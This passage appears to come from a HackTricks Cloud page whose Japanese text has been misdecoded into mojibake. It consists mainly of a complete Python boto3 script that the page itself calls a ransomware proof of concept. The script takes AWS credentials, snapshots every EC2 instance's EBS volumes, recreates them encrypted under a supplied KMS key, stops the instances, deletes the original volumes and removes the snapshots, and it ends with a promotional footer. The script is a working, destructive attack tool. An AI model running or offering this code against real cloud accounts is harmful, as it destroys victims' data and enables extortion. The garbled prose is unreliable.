KMS ã‚­ãƒ¼ã‚’ä½¿ç”¨ã—ã¦ãã‚Œã‚‰ã‚’å¾©å…ƒã—ã€ã‚¹ãƒŠãƒƒãƒ—ã‚·ãƒ§ãƒƒãƒˆã‚’ä»‹ã—ã¦å…ƒã®çŠ¶æ…‹ã«æˆ»ã™ã“ã¨ãŒã§ãã¾ã™ãŒã€ã“ã‚Œã¯æœ€çµ‚çš„ã«ã¯ãƒ©ãƒ³ã‚µãƒ ã‚¦ã‚§ã‚¢ã® PoC ã§ã‚ã‚‹ã“ã¨ã‚’èªè­˜ã—ã¦ãŠã„ã¦ãã ã•ã„ã€‚
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
